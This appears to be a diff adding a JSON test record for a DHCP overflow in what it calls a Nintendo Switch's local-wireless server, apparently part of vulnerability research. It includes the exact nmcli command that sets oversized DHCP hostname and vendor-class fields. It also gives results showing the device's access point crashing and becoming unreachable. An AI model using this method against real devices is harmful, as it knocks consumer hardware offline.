@@ -1,0 +1,28 @@
+{
+  "test": "dhcp_overflow_via_nm_hostname",
+  "timestamp": "2026-11-23T05:30:00Z",
+  "cve": "CVE-2026-82079",
+  "method": "nmcli connection modify switch_F3DCDB0100S ipv4.dhcp-hostname 'A'*255 + ipv4.dhcp-vendor-class-identifier 'B'*255",
+  "overflow_details": {
+    "hostname_option_12_bytes": 255,
+    "vendor_class_option_60_bytes": 255,
+    "total_extra_option_data": 510,
+    "note": "NM sends these in DHCP REQUEST (message type 3)"
+  },
+  "result": {
+    "nm_connection_timeout": true,
+    "nm_state": "connecting (getting IP configuration)",
+    "switch_http_alive": false,
+    "switch_ping_alive": false,
+    "switch_arp_response": "incomplete",
+    "switch_ap_visible_after": false,
+    "wifi_link_state": "disconnected from Switch, fell back to home AP"
+  },
+  "interpretation": "The 255-byte hostname + 255-byte vendor class identifier in the DHCP REQUEST caused the lp2p DHCP server to crash, taking down the entire WiFi AP managed by the ldn sysmodule. The Switch became completely unreachable (HTTP, ping, ARP all failed). The WiFi AP SSID disappeared from scan results.",
+  "baseline_comparison": {
+    "normal_hostname_length": 8,
+    "normal_hostname": "darkstar",
+    "normal_behavior": "DHCP REQUEST → ACK in 13ms, full connectivity"
+  },
+  "confidence": "HIGH — the Switch AP disappeared and all network services became unreachable after sending oversized DHCP options. This is consistent with a stack buffer overflow in the DHCP server crashing the ldn sysmodule."
+}
